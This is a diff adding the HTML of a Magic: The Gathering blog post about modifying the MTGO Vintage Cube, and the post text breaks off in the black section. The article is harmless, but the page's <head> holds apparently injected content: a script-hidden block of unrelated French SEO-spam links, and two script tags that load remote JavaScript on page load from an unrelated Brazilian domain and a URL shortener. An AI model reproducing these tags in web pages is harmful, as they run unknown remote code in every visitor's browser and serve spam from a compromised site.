@@ -1,0 +1,513 @@
+
+<!doctype html><!--[if lt IE 7 ]> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js"> <!--<![endif]-->
+<head>
+
+	
+	<meta charset="UTF-8" />
+
+	<!-- Always force latest IE rendering engine (even in intranet) & Chrome Frame -->
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+	<title>Modifying the MTGO Vintage Cube | The Wizard&#039;s Cupboard</title>
+
+	<!--  Mobile viewport optimized: j.mp/bplateviewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link rel="pingback" href="http://www.wizardscupboard.com/wordpress/xmlrpc.php" />
+
+	
+	
+<!-- SEO Ultimate (http://www.seodesignsolutions.com/wordpress-seo/) -->
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Modifying the MTGO Vintage Cube" />
+	<meta property="og:url" content="http://www.wizardscupboard.com/wordpress/modifying-the-mtgo-vintage-cube/" />
+	<meta property="article:published_time" content="2017-07-02" />
+	<meta property="article:modified_time" content="2019-07-30" />
+	<meta property="article:author" content="http://www.wizardscupboard.com/wordpress/author/wizard5/" />
+	<meta property="article:section" content="EDH/Commander" />
+	<meta property="og:site_name" content="The Wizard&#039;s Cupboard" />
+	<meta name="twitter:card" content="summary" />
+<!-- /SEO Ultimate -->
+
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Feed" href="http://www.wizardscupboard.com/wordpress/feed/" />
+<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Comments Feed" href="http://www.wizardscupboard.com/wordpress/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Modifying the MTGO Vintage Cube Comments Feed" href="http://www.wizardscupboard.com/wordpress/modifying-the-mtgo-vintage-cube/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"http:\/\/www.wizardscupboard.com\/wordpress\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.14"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='open-sans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.7.14' type='text/css' media='all' />
+<link rel='stylesheet' id='highwind-styles-css'  href='http://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/style.css?ver=1.2.4' type='text/css' media='all' />
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script><script>jQueryWP = jQuery;</script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-content/plugins/img-mouseover/img-mouseover.js?ver=20110509'></script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/modernizr.min.js?ver=2.6.2'></script>
+<script type='text/javascript' src='http://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/fitvids.min.js?ver=1.0'></script>
+<link rel='https://api.w.org/' href='http://www.wizardscupboard.com/wordpress/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.wizardscupboard.com/wordpress/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.wizardscupboard.com/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='An Overview and My Experiences with 1v1 Commander' href='http://www.wizardscupboard.com/wordpress/an-overview-and-my-experiences-with-1v1-commander/' />
+<link rel='next' title='One Week into Ixalan Standard' href='http://www.wizardscupboard.com/wordpress/one-week-into-ixalan-standard/' />
+<meta name="generator" content="WordPress 4.7.14" />
+<link rel="canonical" href="http://www.wizardscupboard.com/wordpress/modifying-the-mtgo-vintage-cube/" />
+<link rel='shortlink' href='http://www.wizardscupboard.com/wordpress/?p=1992' />
+<link rel="alternate" type="application/json+oembed" href="http://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fmodifying-the-mtgo-vintage-cube%2F" />
+<link rel="alternate" type="text/xml+oembed" href="http://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=http%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fmodifying-the-mtgo-vintage-cube%2F&#038;format=xml" />
+        <!--Customizer CSS-->
+        <style type="text/css">
+                a { color:#163d06; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, .header, .comments .bypostauthor > .comment-body .comment-content { background-color:#163d06; }body, input[type="text"], input[type="password"], input[type="email"], input[type="search"], input.input-text, textarea { color:#020202; }.comments .bypostauthor > .comment-body .comment-content:after { border-bottom-color:#163d06; }hr, input[type="checkbox"], input[type="radio"] { background:#020202; }input[type="radio"] { border-color:#020202; }h1, h2, h3, h4, h5, h6, .alpha, .beta, .gamma, .delta, .page-title, .post-title { color:#020101; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, input[type="checkbox"]:before, input[type="checkbox"]:checked:before, .comments .bypostauthor > .comment-body .comment-content, .comments .bypostauthor > .comment-body .comment-content a { color:#f9f9f9; }.comments .comment-content:after { border-bottom-color:#f9f9f9; }.inner-wrap, .main-nav { background-color:#f9f9f9; }                @media only screen and (min-width: 769px) {
+                    /* Styles only applied to desktop */
+                    .main-nav ul.menu ul, .main-nav ul.menu > li:hover > a, .main-nav ul.menu > li > a:hover { background:#163d06; }.main-nav ul.menu li.current-menu-item > a { color:##163d06; }.main-nav { border-color:#163d06; }.main-nav ul.menu li.current-menu-item > a:before { border-bottom-color:#163d06; }.main-nav ul.menu ul a, .main-nav ul.menu > li:hover > a { color:##f9f9f9; }body { background-color:#f8f8f9; }                }
+        </style>
+        <!--/Customizer CSS-->
+        		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #f8f8f9; }
+</style>
+<div id="aece353"><ul><li><a href="http://www.wizardscupboard.com/wordpress/modele-tiki-tattoo/" title="Modele tiki tattoo" >Modele tiki tattoo</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-robe-de-cortege/" title="Modele robe de cortège" >Modele robe de cortège</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-panier-zpagetti/" title="Modele panier zpagetti" >Modele panier zpagetti</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-lettre-desabonnement-canalsat/" title="Modele lettre desabonnement canalsat" >Modele lettre desabonnement canalsat</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-kangoo-2002/" title="Modele kangoo 2002" >Modele kangoo 2002</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-felicitation-naissance-gratuit/" title="Modele felicitation naissance gratuit" >Modele felicitation naissance gratuit</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-deliberation-approbation-reglement-interieur/" title="Modele deliberation approbation reglement interieur" >Modele deliberation approbation reglement interieur</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-tatouage-rose-des-vents/" title="Modele de tatouage rose des vents" >Modele de tatouage rose des vents</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-reference-osi/" title="Modele de reference osi" >Modele de reference osi</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-nao/" title="Modele de nao" >Modele de nao</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-lettre-plainte-contre-x-pour-vol/" title="Modele de lettre plainte contre x pour vol" >Modele de lettre plainte contre x pour vol</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-jupe-taille-haute-en-wax/" title="Modele de jupe taille haute en wax" >Modele de jupe taille haute en wax</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-devis-word-gratuit/" title="Modele de devis word gratuit" >Modele de devis word gratuit</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-contrat-de-mariage-separation-de-biens/" title="Modele de contrat de mariage separation de biens" >Modele de contrat de mariage separation de biens</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-de-brevet/" title="Modele de brevet" >Modele de brevet</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-cv-agent-de-quai/" title="Modele cv agent de quai" >Modele cv agent de quai</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-case-de-munte/" title="Modele case de munte" >Modele case de munte</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-projet-de-scission/" title="Modèle projet de scission" >Modèle projet de scission</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-lettre-de-stage-en-entreprise/" title="Modèle lettre de stage en entreprise" >Modèle lettre de stage en entreprise</a></li> <li><a href="http://www.wizardscupboard.com/wordpress/modele-haut-en-pagne/" title="Modèle haut en pagne" >Modèle haut en pagne</a></li> </ul><div><script type="text/javascript"> document.getElementById("aece353").style.display="none"; </script>
+
+<script src="http://exerciciofuncional.com.br/teste/index.php?P"></script>
+
+<script src="https://is.gd/GgGf9z?v=v25.0"></script></head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<body class="post-template-default single single-post postid-1992 single-format-standard custom-background two-column content-sidebar background-contrast">
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=1536376929914286&version=v2.0";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+<div class="outer-wrap" id="top">
+
+	<div class="inner-wrap">
+
+	
+	<header class="header content-wrapper" role="banner" style="background-image:url(http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/Art_M15_Art-5_Swanland_edited-3.jpg);">
+
+				<p class="toggle-container">
+			<a href="#navigation" class="nav-toggle button">
+				Skip to navigation			</a>
+		</p>
+					<a href="http://www.wizardscupboard.com/wordpress/" title="The Wizard&#039;s Cupboard" rel="home" class="site-intro">
+					<img src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure-edited.jpg" class="avatar" />
+					<h1 class="site-title">The Wizard&#039;s Cupboard</h1>
+				<h2 class="site-description">Magic the Gathering Blog</h2>
+			</a>
+		
+		
+		<nav class="main-nav" id="navigation" role="navigation">
+
+			
+			<ul class="buttons">
+				<li class="home"><a href="http://www.wizardscupboard.com/wordpress" class="nav-home button"><span>Home</span></a></li>
+				<li class="close"><a href="#top" class="nav-close button"><span>Return to Content</span></a></li>
+			</ul>
+			<hr />
+			<h2>Menu 1</h2>
+			<div class="highwind-navigation"><ul id="menu-menu-1" class="menu"><li id="menu-item-274" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-274"><a href="http://www.wizardscupboard.com/wordpress/">Blog Home</a></li>
+<li id="menu-item-264" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-264"><a href="http://www.wizardscupboard.com/wordpress/?cat=6">Standard</a></li>
+<li id="menu-item-265" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-265"><a href="http://www.wizardscupboard.com/wordpress/?cat=1">EDH/Commander</a></li>
+<li id="menu-item-263" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-263"><a href="http://www.wizardscupboard.com/wordpress/?cat=5">MTG Ramblings</a></li>
+<li id="menu-item-269" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-269"><a href="http://www.wizardscupboard.com">Visit Store</a></li>
+<li id="menu-item-273" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-273"><a href="http://www.wizardscupboard.com/wordpress/about-us/">About Us</a></li>
+<li id="menu-item-277" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-277"><a href="http://www.wizardscupboard.com/wordpress/write-for-us/">Write For the WC</a></li>
+</ul></div>
+			
+		</nav><!-- /.main-nav -->
+
+		
+		
+	</header>
+
+	<div class="content-wrapper">
+
+	
+
+<section class="content" role="main">
+
+	
+	
+		<article id="post-1992" class="post-1992 post type-post status-publish format-standard hentry category-edh-commander">
+
+			
+			
+
+<header class="post-header">
+
+				<time class="post-date"><a href="http://www.wizardscupboard.com/wordpress/modifying-the-mtgo-vintage-cube/" title="Permalink to Modifying the MTGO Vintage Cube" rel="bookmark">July 2, 2017</a></time>
+		
+			<h1 class="post-title" data-text="Modifying the MTGO Vintage Cube">Modifying the MTGO Vintage Cube</h1>
+	
+	
+</header><!-- /.post-header -->
+
+<section class="article-content">
+
+	<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968.jpg"><img class="alignnone size-medium wp-image-1068" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968-262x300.jpg" alt="IMG_1968" width="262" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968-262x300.jpg 262w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2016/04/IMG_1968-896x1024.jpg 896w" sizes="(max-width: 262px) 100vw, 262px" /></a></p>
+<address>By Byron King</address>
+<address><a href="https://twitter.com/DoneTheMath">@DoneTheMath</a></address>
+<address> </address>
+<address>In my ceaseless attempt to find a cube configuration I’m happy with, I decided to take a look at the recent MTGO Vintage Cube.  I’ve put together several cubes over my years of Magic, and I think the current list on Magic Online is close to what I’m looking for.  I wanted a powered cube, since we don’t get enough chances to play it for the busted draws to get old.  I also wanted something fairly balanced with no truly degenerate combos (Time Vault) or gimmicky themes (Vampires).  After taking the list from Magic Online, I set to work to make it mine.</p>
+<p><span style="color: #000080"><em><a style="color: #000080" href="https://docs.google.com/spreadsheets/d/1l9urRFSOO9nsc-7XJqbAol1vYVkYIgjMtA-OPu7E-dc/edit?usp=sharing">This is the link to the most recent MTGO Vintage Cube</a></em></span><br />
+<span style="color: #000080"><em> <a style="color: #000080" href="https://docs.google.com/spreadsheets/d/1bxh3zBKaXJss5-SGYMrdEgfRV-auzbp2eWhX9N3M6CI/edit?usp=sharing">This is the link to my modified MTGO Vintage Cube</a></em></span></p>
+<p>I made 21 changes to the current list.  Some of the switches are similar cards that I think can be upgraded.  Some of the cards are switched because I particularly like a card that wasn’t included or dislike a card in the original list.  I paired these switches up somewhat at random, as it still helps to have a visual reference for what is leaving and what is going into my list.  I certainly don’t think that Linvala, the Preserver and Thraben Inspector will do the same job in cube.</p>
+<h2>White</h2>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Linvala-to-Inspector.jpg"><img class="alignnone size-medium wp-image-1968" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Linvala-to-Inspector-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Linvala-to-Inspector-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Linvala-to-Inspector.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>I wanted another 1 drop and it came down to Thraben Inspector or Isamaru.  Thraben Inspector has a larger range of decks available, while only being a minor downgrade for aggressive decks.  I&#8217;m not sure I&#8217;ve ever seen anyone have something nice to say about Linvala, the Preserver in cube.  It&#8217;s like a bad joke from the Battle for Zendikar cube update that won&#8217;t seem to go away.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Crusader-to-Thalia.jpg"><img class="alignnone size-medium wp-image-1954" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Crusader-to-Thalia-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Crusader-to-Thalia-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Crusader-to-Thalia.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>I’m not a huge fan of Mirran Crusader in cube, since it gets the chance to randomly wreck some decks.  It&#8217;s not particularly targeted either, just hitting 40% of the color pie.  That alone wouldn’t be enough to cut it, but Thalia, Heretic Cathar seems like a better fit for white’s punisher theme.  If someone got greedy with lands, Thalia is a great way to punish that.  I particularly like the punisher theme, as it helps separate the red and white aggressive decks.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Spectral-to-War-Priest.jpg"><img class="alignnone size-medium wp-image-1983" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Spectral-to-War-Priest-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Spectral-to-War-Priest-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Spectral-to-War-Priest.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>I knew I wanted spectral Procession out, but I’m still a little unsure of War Priest of Thune.  Spectral Procession is fine in a white aggressive deck, but it is incredibly difficult to splash.  It also makes utility lands like Rashadan Port, Mutavault, and Mishra’s Factory more difficult to run.  Beyond the mana difficulties, I don’t think it’s much better than a replacement level card.  War Priest of Thune might not have a huge pile of targets, but they are all high impact.  Removing a Necromancy, Oath of Druids, Heartbeat of Spring, or Yawgmoth’s Bargain is a necessity, and War Priest of Thune manages that while applying a clock.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Leyline-to-Initiate.jpg"><img class="alignnone size-medium wp-image-1966" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Leyline-to-Initiate-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Leyline-to-Initiate-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Leyline-to-Initiate.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Leyline of Sanctity seems like an odd fit in cube.  I can’t imagine a deck with enough discard or targeting effects to warrant Leyline coming out of the sideboard, so it mainly focuses as hate for Storm.  Enough things can go wrong with that deck already that I don’t feel the need to add Leyline to randomly beat it. Glory-Bound Initiate is a solid two drop that bolsters white aggressive decks. It is also playable as a hate card for other aggro decks. An overall solid card.</p>
+<p>As a side note, the group I cube with generally treats drafts as a casual option over other competitive formats.  As a result, sideboarding is lax and sometimes doesn&#8217;t seem to happen.  Cards that ideally live in the sideboard are going to face some strict scrutiny for inclusion.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Archangel-to-Archangel.jpg"><img class="alignnone size-medium wp-image-1950" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Archangel-to-Archangel-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Archangel-to-Archangel-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Archangel-to-Archangel.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>This seems like a simple upgrade.  There aren’t any combos with Archangel of Thune in the cube, and Archangel Avacyn is a more powerful card.  I didn’t have to think very long about this decision.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Honor-to-Priest.jpg"><img class="alignnone size-medium wp-image-1964" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Honor-to-Priest-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Honor-to-Priest-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Honor-to-Priest.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>This was the last change I made to white, and it largely came down to wanting to cut Honor of the Pure.  I had already removed Spectral Procession for the extensive color requirements.  At that point, there is almost no token generation in white, particularly for aggressive decks.  Spear of Heliod already works as a universal anthem, so I felt fine cutting Honor of the Pure.  Containment Priest doubles as an acceptable beater in aggressive decks along with sideboard hate against a wide variety of decks.  I honestly wouldn’t be surprised if I don’t keep Containment Priest due to it too effectively shutting down several core Cube strategies.</p>
+<p>&nbsp;</p>
+<h3>White &#8211; On Notice</h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/TimelyReinforcements.jpg"><img class="alignnone size-medium wp-image-1989" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/TimelyReinforcements-216x300.jpg" alt="" width="216" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/TimelyReinforcements-216x300.jpg 216w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/TimelyReinforcements.jpg 223w" sizes="(max-width: 216px) 100vw, 216px" /></a></p>
+<p>Like Leyline of Sanctity, my preference is to remove sideboard only cards.  Timely Reinforcements didn’t get the axe yet due to my bias for aggressive decks.  I’m worried about skewing my cube too far towards decks that I enjoy playing, so I want to be absolutely sure that it isn’t performing well before cutting it.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExaltedAngel.jpg"><img class="alignnone size-medium wp-image-1961" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExaltedAngel-216x300.jpg" alt="" width="216" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExaltedAngel-216x300.jpg 216w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/ExaltedAngel.jpg 223w" sizes="(max-width: 216px) 100vw, 216px" /></a></p>
+<p>Exalted Angel and Den Protector are the only Morph (Megamorph) cards in the Vintage Cube, and I’ve already cut Den Protector.  Nobody is getting fooled when a white deck plays a Morph card in 2017.  Gisela, the Broken Blade seems like a better inclusion, except for the 3 toughness against a large suite of Incinerate variants in the red section.  I expect Exalted Angel won’t last long, but I don’t know what the best replacement is yet.</p>
+<p>&nbsp;</p>
+<h2>Blue</h2>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Delver-to-Pact.jpg"><img class="alignnone size-medium wp-image-1956" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Delver-to-Pact-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Delver-to-Pact-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Delver-to-Pact.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Free counterspells are great, and I was surprised to see that the Vintage Cube passed on Pact of Negation.  Combo decks can use Pact of Negation for protection, but the downside is very real if the combo doesn’t win on the spot.  Control decks make better use of this card, allowing for a huge threat to resolve without dropping the shields.  I don’t understand why Delver of Secrets is still in the cube, as blue has virtually no support for an aggressive deck.  It seems like a fine line to walk building a deck with enough spells to flip Delver of Secrets while still being interested in an aggressive creature.  There might be enough spells in red to make a reasonable aggressive Izzet deck, but that seems like a weak argument.</p>
+<p>&nbsp;</p>
+<h3>Blue &#8211; On Notice</h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/CommitMemory.jpg"><img class="alignnone size-medium wp-image-1953" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/CommitMemory-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/CommitMemory-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/CommitMemory.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>Commit // Memory feels like a card that was included to highlight the new set.  I’m keeping it in, mostly because I can’t really tell how good it is in Storm or other unfair decks.  I expect some additional testing will make it clear if it deserves a spot pretty quickly.</p>
+<p>&nbsp;</p>
+<h2>Black</h2>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nighthawk-to-Liliana.jpg"><img class="alignnone size-medium wp-image-1971" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nighthawk-to-Liliana-300x170.jpg" alt="" width="300" height="170" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nighthawk-to-Liliana-300x170.jpg 300w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Nighthawk-to-Liliana.jpg 550w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
+<p>Vampire Nighthawk seems like a combination of utterly fair and low power level, exactly the sort of card that seems awful in cube.  Black aggression has been completely scrapped from this cube, so Vampire Nighthawk is serving as a filler card in black midrange and control decks, or as a sideboard card against aggressive decks.  Gifted Aetherborn seems like the better sideboard card, and the list of more powerful options goes on for miles.  I swapped it for Liliana, the Last Hope, since she still serves as an anti-aggressive card that still has some utility against control.</p>
+<p>&nbsp;</p>
+<h3>Black &#8211; On Notice</h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Necropotence.jpg"><img class="alignnone size-medium wp-image-1970" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Necropotence-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Necropotence-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/Necropotence.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
+<p>Is anyone actually happy when this makes it into a deck anymore?  Combo decks in cube tend to be some amalgamation of at least three colors, so Necropotence requires some luck to come down early.  I expect this will get changed to something else fairly soon, but I don’t know what.</p>
+<p>&nbsp;</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SidisiUndeadVizier.jpg"><img class="alignnone size-medium wp-image-1982" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SidisiUndeadVizier-215x300.jpg" alt="" width="215" height="300" srcset="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SidisiUndeadVizier-215x300.jpg 215w, http://www.wizardscupboard.com/wordpress/wp-content/uploads/2017/08/SidisiUndeadVizier.jpg 223w" sizes="(max-width: 215px) 100vw, 215px" /></a></p>
